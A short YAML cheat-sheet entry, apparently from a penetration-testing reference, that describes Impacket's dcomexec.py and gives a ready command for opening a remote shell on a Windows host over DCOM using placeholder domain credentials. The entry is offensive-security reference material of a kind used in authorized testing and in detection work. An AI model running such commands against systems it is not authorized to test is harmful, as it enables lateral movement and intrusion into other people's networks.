---
description: |
  Impacket's dcomexec.py provides an interactive shell on the Windows host similar to wmiexec.py, but using varying DCOM endpoints.

  Currently supports MMC20.Application, ShellWindows, and ShellBrowserWindow DCOM objects.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

  	DCOM Object: MMC20
command: |
  python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1
items:
  - Password
  - Username
services:
  - DCOM
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py
  - https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/
---
